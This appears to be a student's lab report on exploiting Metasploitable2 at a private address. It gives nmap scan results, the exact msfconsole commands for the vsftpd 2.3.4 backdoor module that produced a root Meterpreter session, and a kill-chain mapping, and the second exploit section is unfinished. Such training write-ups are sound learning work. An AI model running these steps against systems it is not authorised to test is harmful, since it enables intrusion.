# Metasploitable2 Exploitation Report

**Name:** <Emmanuel Gregory Opoku Owusu-Afriyie>
**Index Number:** <4195524>
**Date:** 2026-09-21
**Target IP:** 192.168.1.3
**Attacker OS / Tools:** Kali Linux, Metasploit Framework, nmap

---

## Reconnaissance Summary

Ran an nmap service/version scan against the target:

Key open ports found:
- 21/tcp - vsftpd 2.3.4 (anonymous FTP login allowed)
- 22/tcp - OpenSSH 4.7p1 Debian 8ubuntu1
- 23/tcp - Linux telnetd
- 25/tcp - Postfix smtpd
- 53/tcp - ISC BIND 9.4.2
- 80/tcp - Apache httpd 2.2.8 (Ubuntu) DAV/2
- 111/tcp - rpcbind
- 2049/tcp - nfs

---

## Exploit 1: vsftpd 2.3.4 Backdoor

- **Service / Port:** FTP / 21
- **Vulnerability:** vsftpd 2.3.4 backdoor (CVE-2011-2523)
- **Tool Used:** Metasploit — exploit/unix/ftp/vsftpd_234_backdoor
- **Why This Tool:** This exact vsftpd version has a known, publicly documented backdoor built into that release of the source code. Metasploit ships a purpose-built module for it, so it's the fastest and most reliable way to exploit this specific vulnerability rather than crafting a manual payload.
- **Steps:**
  1. `msfconsole`
  2. `search vsftpd`
  3. `use 1` (exploit/unix/ftp/vsftpd_234_backdoor)
  4. `set RHOSTS 192.168.1.3`
  5. `set LHOST <kali-ip>`
  6. `exploit`
- **Evidence:** evidence/exploit1.png
- **Cyber Kill Chain Stage(s):** Reconnaissance, Weaponization, Delivery, Exploitation, Installation, C2, Actions on Objectives
  - Reconnaissance: the nmap scan identified the vulnerable vsftpd version.
  - Weaponization: selecting the matching Metasploit module and setting RHOSTS/LHOST paired the vulnerability with a working exploit configuration.
  - Delivery/Exploitation: running `exploit` sent the malicious connection that triggered the backdoor.
  - Installation/C2: a Meterpreter session was established, giving remote control of the target.
  - Actions on Objectives: ran `getuid`/`sysinfo` to confirm root-level access.
- **Outcome / Impact:** Obtained a root-level Meterpreter session on the target.

---

## Exploit 2:

(to be added)
